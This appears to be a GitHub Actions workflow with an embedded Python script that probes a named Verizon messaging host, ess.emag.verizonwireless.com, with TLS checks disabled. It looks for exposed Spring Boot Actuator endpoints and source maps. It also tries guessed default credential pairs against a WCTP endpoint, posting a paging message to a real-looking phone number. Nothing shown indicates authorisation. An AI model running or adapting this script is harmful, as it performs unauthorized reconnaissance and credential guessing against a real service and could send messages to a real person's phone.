name: EMAG Phase 14
on:
  workflow_dispatch:
  push:
    branches: [main]

jobs:
  phase14:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: EMAG Phase 14
        run: |
          python3 - << 'PYEOF'
          import urllib.request, urllib.error, json, ssl, base64
          ctx = ssl.create_default_context()
          ctx.check_hostname = False
          ctx.verify_mode = ssl.CERT_NONE
          BASE = "https://ess.emag.verizonwireless.com"
          
          def get(url, hdrs=None, meth="GET", body=None, maxb=4096):
              h = {"User-Agent": "Mozilla/5.0"}
              if hdrs: h.update(hdrs)
              data = body.encode() if isinstance(body, str) else body
              rq = urllib.request.Request(url, data=data, headers=h, method=meth)
              try:
                  op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
                  with op.open(rq, timeout=10) as r:
                      return r.status, r.read(maxb).decode(errors="replace")
              except urllib.error.HTTPError as e:
                  return e.code, e.read(512).decode(errors="replace")
              except Exception as e:
                  return 0, str(e)
          
          print("=== VMG legacy paths ===")
          for path in [
              "/vmg/",
              "/vmg/api/messages",
              "/vmg/wctp",
              "/vmg/api/reports",
              "/vmg/auth/business/login",
              "/vmg/assets/js/",
          ]:
              s, b = get(BASE + path)
              is_html = "<html" in b[:100].lower()
              if s == 403 or (s == 200 and not is_html):
                  print(f"[{s}] INTERESTING {path}: {b[:200]}")
              else:
                  print(f"[{s}] {path} (html={is_html})")
          
          print()
          print("=== Spring Boot Actuator ===")
          for path in [
              "/actuator",
              "/actuator/",
              "/actuator/health",
              "/actuator/info",
              "/actuator/env",
              "/actuator/beans",
              "/emag/actuator",
              "/emag/actuator/health",
              "/emag/actuator/info",
              "/emag/actuator/env",
              "/emag/actuator/beans",
              "/emag/actuator/mappings",
          ]:
              s, b = get(BASE + path)
              if s != 404:
                  print(f"[{s}] {path}: {b[:200]}")
              else:
                  print(f"[{s}] {path}")
          
          print()
          print("=== JS Source Maps ===")
          for path in [
              "/emag/assets/js/open/landing.js.map",
              "/emag/assets/js/open/landing_services.js.map",
              "/emag/assets/js/backbone-concat.js.map",
              "/emag/assets/css/emag-modern.css.map",
              "/emag/assets/css/backbone-concat.css.map",
          ]:
              s, b = get(BASE + path)
              if s == 200:
                  print(f"[FOUND] {path}: {b[:300]}")
              else:
                  print(f"[{s}] {path}")
          
          print()
          print("=== WCTP with Basic Auth ===")
          wctp = ("<?xml version=\"1.0\"?>"
              "<wctp-Operation wctpVersion=\"WCTP-DTD-V1r1\">"
              "<wctp-SubmitRequest>"
              "<wctp-SubmitHeader submitID=\"1\">"
              "<wctp-Originator senderID=\"12345\" securityCode=\"test\"/>"
              "<wctp-Recipient recipientID=\"+12283359820\"/>"
              "</wctp-SubmitHeader>"
              "<wctp-Payload><wctp-AlphanumericMessage>test</wctp-AlphanumericMessage></wctp-Payload>"
              "</wctp-SubmitRequest>"
              "</wctp-Operation>")
          for sid, pwd in [("12345","test"), ("99999","pass"), ("test","test"), ("emag","emag")][:]:
              cred = base64.b64encode(f"{sid}:{pwd}".encode()).decode()
              s, b = get(BASE + "/emag/wctp",
                  hdrs={"Authorization": f"Basic {cred}", "Content-Type": "text/xml"},
                  meth="POST", body=wctp)
              print(f"[{s}] WCTP BasicAuth {sid}:{pwd}: {b[:150]}")
          
          print()
          print("=== Robots.txt and sitemap ===")
          for path in ["/robots.txt", "/sitemap.xml", "/emag/robots.txt", "/emag/sitemap.xml"][:]:
              s, b = get(BASE + path, maxb=2048)
              if s == 200:
                  print(f"[{s}] {path}: {b[:500]}")
              else:
                  print(f"[{s}] {path}")
          
          print("DONE")
          PYEOF
